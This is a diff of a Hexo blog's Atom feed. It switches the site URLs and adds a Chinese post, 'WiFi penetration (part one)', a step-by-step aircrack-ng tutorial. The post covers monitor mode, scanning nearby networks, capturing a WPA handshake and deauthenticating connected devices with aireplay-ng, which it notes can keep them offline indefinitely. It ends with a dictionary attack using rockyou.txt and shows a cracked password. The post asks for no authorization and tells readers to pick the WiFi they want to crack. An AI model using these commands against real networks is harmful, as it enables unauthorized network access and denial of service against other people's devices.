@@ -3,11 +3,11 @@
   <title>山城冰荔枝</title>
   
   
-  <link href="http://example.com/atom.xml" rel="self"/>
+  <link href="https://sfyyh.github.io/atom.xml" rel="self"/>
   
-  <link href="http://example.com/"/>
-  <updated>2023-08-03T12:15:09.569Z</updated>
-  <id>http://example.com/</id>
+  <link href="https://sfyyh.github.io/"/>
+  <updated>2023-08-03T13:44:13.835Z</updated>
+  <id>https://sfyyh.github.io/</id>
   
   <author>
     <name>山城冰荔枝</name>
@@ -17,9 +17,29 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>my-first-blog</title>
+    <link href="https://sfyyh.github.io/2023/08/03/my-first-blog/"/>
+    <id>https://sfyyh.github.io/2023/08/03/my-first-blog/</id>
+    <published>2023-08-03T13:43:26.000Z</published>
+    <updated>2023-08-03T13:44:13.835Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="wifi渗透-一"><a href="#wifi渗透-一" class="headerlink" title="wifi渗透(一)"></a>wifi渗透(一)</h1><h3 id="第三步——检查并开启网卡的监听功能"><a href="#第三步——检查并开启网卡的监听功能" class="headerlink" title="第三步——检查并开启网卡的监听功能"></a>第三步——检查并开启网卡的监听功能</h3><p>airmon-ng：检查网卡是否支持监听功能的</p><p><img src="https://picture.gotarget.top//image-20220206191950754.png" alt="image-20220206191950754"></p><p>airmon-ng start wlan0mon ：激活无线网卡的监听模式</p><p><img src="https://picture.gotarget.top//image-20220206192030956.png" alt="image-20220206192030956"></p><h3 id="第四步——扫描周边wifi信号"><a href="#第四步——扫描周边wifi信号" class="headerlink" title="第四步——扫描周边wifi信号"></a>第四步——扫描周边wifi信号</h3><p>airodump-ng wlan0mon ：扫描当前周边环境的WiFi信号</p><p><img src="https://picture.gotarget.top//image-20220206192404063.png" alt="image-20220206192404063"></p><p><strong>注意：找到你要破解的wifi信息，记住它的BSSID和CH,后面要用！</strong></p><h3 id="第五步——抓包"><a href="#第五步——抓包" class="headerlink" title="第五步——抓包"></a>第五步——抓包</h3><p>下面里的部分信息根据自己的情况进行替换</p><p>抓包命令：airodump-ng -c &#x3D;&#x3D;CH号码&#x3D;&#x3D; –bssid &#x3D;&#x3D;BSSID号码&#x3D;&#x3D; -w &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake wlan0mon</p><p><strong>注意：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-w后接抓包后得到的文件保存路径和名称，注意路径！ 我的用户名是kali，你的填你自己的</span><br></pre></td></tr></table></figure><p><img src="https://picture.gotarget.top//image-20220206192728797.png" alt="image-20220206192728797"></p><p><strong>注：这种方式是一种被动等待的方式，所以我们需要将链接在该wifi上的设备踢下线，以便我们快速抓包。</strong></p><p><strong>这里我们需要记下BSSID(WIFI路由地址)和STATION（链接设备号），接下来我们将该设备从该wifi链接状态下强制踢下线</strong></p><h3 id="第六步——打掉连接"><a href="#第六步——打掉连接" class="headerlink" title="第六步——打掉连接"></a>第六步——打掉连接</h3><p>ACK 死亡攻击：aireplay-ng -0 10 -a BSSID号 -c STATION号 wlan0mon</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10——是攻击次数，一般10次就足够我们抓到包了，如果将次数调整的很大，那么就会持续的进行攻击，导致该设备长期无法链接到该wifi!</span><br></pre></td></tr></table></figure><p><strong>注：这样做将会导致连接在该wifi上的设备被强制下线，然后因为wifi的自动重连机制，使得我们可以快速抓到包</strong>。</p><p><img src="https://picture.gotarget.top//image-20220206193900205.png" alt="image-20220206193900205"></p><h3 id="最后一步——破解"><a href="#最后一步——破解" class="headerlink" title="最后一步——破解"></a>最后一步——破解</h3><h4 id="破解语法："><a href="#破解语法：" class="headerlink" title="破解语法："></a>破解语法：</h4><p>aircrack-ng -w &lt;指定字典&gt; -b &lt;目的路由MAC地址&gt; &lt;抓到的握手包&gt;</p><p><strong>注</strong>：目的路由MAC地址——就是BSSID 抓到的握手包——cap文件</p><h4 id="kali自带字典："><a href="#kali自带字典：" class="headerlink" title="kali自带字典："></a>kali自带字典：</h4><p>aircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -b 78:72:5D:E0:BC:37 &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake-0*.cap</p><p><strong>需要先解压</strong>：gzip -d &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz</p><h4 id="自我指定字典："><a href="#自我指定字典：" class="headerlink" title="自我指定字典："></a>自我指定字典：</h4><p>aircrack-ng -w &#x2F;home&#x2F;kali&#x2F;password.txt -b 78:72:5D:E0:BC:37 &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake-0*.cap</p><h3 id="成功！"><a href="#成功！" class="headerlink" title="成功！"></a>成功！</h3><p><img src="https://picture.gotarget.top//image-20220206164700961.png" alt="image-20220206164700961"></p><p>破解的wifi密码就为a123456789</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;wifi渗透-一&quot;&gt;&lt;a href=&quot;#wifi渗透-一&quot; class=&quot;headerlink&quot; title=&quot;wifi渗透(一)&quot;&gt;&lt;/a&gt;wifi渗透(一)&lt;/h1&gt;&lt;h3 id=&quot;第三步——检查并开启网卡的监听功能&quot;&gt;&lt;a href=&quot;#第三步——检查并开启</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>Hello World</title>
-    <link href="http://example.com/2023/08/03/hello-world/"/>
-    <id>http://example.com/2023/08/03/hello-world/</id>
+    <link href="https://sfyyh.github.io/2023/08/03/hello-world/"/>
+    <id>https://sfyyh.github.io/2023/08/03/hello-world/</id>
     <published>2023-08-03T12:15:09.569Z</published>
     <updated>2023-08-03T12:15:09.569Z</updated>
     
